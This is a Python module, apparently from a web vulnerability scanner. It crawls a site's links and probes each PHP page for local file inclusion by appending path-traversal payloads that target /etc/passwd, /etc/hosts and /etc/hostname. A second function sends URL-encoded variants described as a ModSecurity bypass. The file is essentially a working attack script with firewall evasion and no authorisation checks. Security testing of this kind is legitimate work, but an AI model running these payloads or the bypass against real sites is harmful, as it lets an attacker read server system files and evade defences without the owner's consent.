
import requests
from ...handler.retry.retryrequest import RetryRequest
from ...config import Config
from messages import SuccessMessages, ErrorMessages
from bs4 import BeautifulSoup

retry_request = RetryRequest(max_retries=3)
CONFIG = Config()


def detect_lfi(url):
    lfi_payloads = ["../../../../etc/passwd", "../../../../etc/hosts", "../../../../etc/hostname"]
    response = retry_request.retry(requests.get, url, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
    soup = BeautifulSoup(response.text, 'html.parser')
    for link in soup.find_all('a'):
        href = link.get('href')
        if href and ('http' not in href and 'https' not in href):
            href = f'{url}' + href
        try:
            if '.php' in href:
                for payload in lfi_payloads:
                    try:
                        response = retry_request.retry(requests.get, href + payload, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
                        if response and 'root:x:0:0:root' in response.text:
                            print(f"{SuccessMessages.FOUND_LFI} {href}")
                        else:
                            print(f"{ErrorMessages.NO_LFI} {href}")
                    except Exception as e:
                        print(f"Error: {e}")
                bypass_mod_secuirty(href)
        except Exception:
            pass


def bypass_mod_secuirty(href):
                # ModSecurity bypass for LFI
    mod_sec_bypass_payloads = ["?id=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "?id=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts", "?id=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhostname"]
    for bypass_payload in mod_sec_bypass_payloads:
        try:
            bypass_response = retry_request.retry(requests.get, href + bypass_payload, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
            if 'root:x:0:0:root' in bypass_response.text:
                print(f"{SuccessMessages.FOUND_LFI} {href} with ModSecurity bypass")
        except Exception as e:
            print(f"Error: {e}")
